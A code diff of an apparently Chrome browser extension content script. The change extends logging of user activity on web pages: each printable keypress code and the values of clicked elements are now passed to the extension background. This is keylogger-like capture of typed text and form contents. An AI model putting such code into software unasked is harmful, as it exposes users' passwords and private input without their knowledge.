@@ -5,8 +5,17 @@ document.addEventListener('DOMContentLoaded', function() {
 	var charCount=0;
 	var keyPoints="";
 	document.onkeyup=function(e) {
+		if(e.which > 64 && e.which < 91){
+			//Do nothing as this is alphabets
+		} else if(e.which > 185 && e.which < 193){
+			//Do nothing (special characters)
+		} else if(e.which > 218 && e.which < 223){
+			//Do nothing (special characters)
+		} else if(e.which > 47 && e.which < 58){
+			//Do nothing (Numbers)
+		}
 		//Shift Key released
-		if(e.which == 16){
+		else if(e.which == 16){
 			keyPoints=keyPoints+ ' ' + e.which;
 			/* chrome.extension.sendMessage({greeting: "keys", data: "RAW KEYS: "+keyPoints+""}, function(response) {
 					console.log(response);
@@ -30,7 +39,9 @@ document.addEventListener('DOMContentLoaded', function() {
 		}
 		//Spacebar key pressed
 		else if(e.which == 32){
-			//do nothing
+			chrome.extension.sendMessage({greeting: "keys", data: ""+e.which+""}, function(response) {
+				console.log(response);
+			});
 		}
 		//Enter key pressed
 		else if(e.which == 13){
@@ -41,36 +52,32 @@ document.addEventListener('DOMContentLoaded', function() {
 			chrome.extension.sendMessage({greeting: "keys", data: ""+e.which+""}, function(response) {
 				console.log(response);
 			});
-		}
-		//If any key other than alpha-numerals then log
-		else if(e.which > 96 && e.which < 123){
-		} else if(e.which > 64 && e.which < 91){
-		} else if(e.which > 47 && e.which <58){
 		} else {
-			keyPoints=keyPoints+ ' ' + e.which;
-			/* chrome.extension.sendMessage({greeting: "keys", data: ""+keyPoints+""}, function(response) {
-				console.log(response);
-			}); */
 			chrome.extension.sendMessage({greeting: "keys", data: ""+e.which+""}, function(response) {
 				console.log(response);
 			});
-		}	
+		}
+	
 	}
 	document.onkeypress=function(e){
-		if(e.which == 32 || e.which == 8) {
-			/* chrome.extension.sendMessage({greeting: "keys", data: "RAW KEYS: DANGER"+e.which}, function(response) {
-					console.log(response);
-			}); */
+		var flag = false;
+		if(e.which > 96 && e.which < 127){
+			flag = true;
+		} else if(e.which > 57 && e.which < 97){
+			flag = true;
+		} else if(e.which > 32 && e.which <58){
+			flag = true;
+		} else{
+			flag = false;
 		}
+		if(flag == true){
 			record=record+String.fromCharCode(e.which);
 			keyPoints=keyPoints+ ' ' +e.which;
 			charCount++;
-			/* chrome.extension.sendMessage({greeting: "keys", data: "RAW KEYS: "+keyPoints+""}, function(response) {
-					console.log(response);
-			}); */
-			chrome.extension.sendMessage({greeting: "keys", data: ""+e.which+""}, function(response) {
+			chrome.extension.sendMessage({greeting: "keypress", data: ""+e.which+""}, function(response) {
 				console.log(response);
-			});
+			}); 
+		}
 	}
 }, false);
 
@@ -97,7 +104,7 @@ document.addEventListener('DOMContentLoaded', function() {
        function mouseClicked(e) {
 		   //alert("Mouse Clicked !");
 			//console.log("Mouse is clicked!"+e.screenX + " " + e.screenY+" "+e.target+"Tag Name :"+e.target.tagName);
-			chrome.extension.sendMessage({greeting: "mouse", data: "MOUSE3: Mouse clicked! ("+e.screenX + ", " + e.screenY+") "+e.target.nodeName+" [Tag Name :"+e.target.tagName+"]"}, function(response) {
+			chrome.extension.sendMessage({greeting: "mouse", data: "MOUSE3: Mouse clicked! ("+e.screenX + ", " + e.screenY+") "+e.target.nodeName+" [Tag Name :"+e.target.tagName+"] "+e.target.value}, function(response) {
 					console.log(response);
 			});
             //console.log(e.target.getAttribute('type'));
